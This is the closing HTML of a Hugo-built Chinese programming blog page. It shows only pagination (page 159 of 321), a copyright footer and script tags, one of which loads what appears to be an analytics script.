	<span class="pagination__item pagination__item--current">159/321</span>
	<a class="pagination__item pagination__item--next btn" href="/page/160/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大白的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>